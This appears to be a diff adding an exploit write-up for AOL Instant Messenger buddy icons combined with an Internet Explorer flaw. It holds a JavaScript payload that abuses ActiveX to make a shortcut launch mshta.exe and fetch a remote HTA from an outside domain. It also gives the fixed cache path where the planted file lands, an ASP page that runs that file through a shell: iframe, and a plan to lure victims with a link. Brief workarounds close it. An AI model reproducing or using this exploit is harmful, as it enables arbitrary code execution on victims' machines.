@@ -1,0 +1,46 @@
+Using a 3rd party AOL Instant Messenger client one can import a file that uses local HTML execution code. like pidgin for example.
+For instance, the contents of such file might be of a jpg file opened in notepad:
+
+<script>
+var ok = new ActiveXObject("Shell.Application");
+f = ok.NameSpace("C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Accessories");
+i= f.ParseName("Paint.lnk");
+l = i.GetLink;
+l.Path = "mshta.exe"
+l.Arguments ="http://www.yourdomain.com/ok.hta"
+l.Save("C:\\paint.lnk");
+ok.Open("C:\\paint.lnk");
+</script>
+
+
+
+Sending to yourself first a file is written to the following known location that you have to find:
+
+c:\documents and settings\username\application data\aim\bartcache\1\
+
+One can verify that the icon is in fact the HTML by opening it with Notepad. The filename is permanent for EVER AOL/AIM
+
+user every time the icon is imported. The consequences of this is that one can upload a file to the victim's machine
+
+knowing fully that the file is not what it is supposed to be and it's exact location on the hard drive.
+
+
+An HTML page created using the following code can be used to run the HTML file on the victim's machine,
+
+taking advantage of the Internet Explorer vulnerability:
+
+--------index html file---------------
+var file_name = Request.QueryString[0];
+Response.Write(<iframe src="shell:appdata\aim\bartcache\1\" + file_name + "></iframe>);
+----------end index file-----------------------
+
+
+The file name and location is fixed for all AOL users. Now it is a simple matter of directing the victim to the proper web page,
+
+perhaps by sending a hyperlink to the malicious page. The result is the "HTML" file being executed on the victim's 
+
+machine and thus arbitrary code execution occurs.
+
+Workarounds
+ * Turn off buddy icons in My Aim > Edit Options > Edit Preferences > Buddy Icons
+ * Disable scripting 
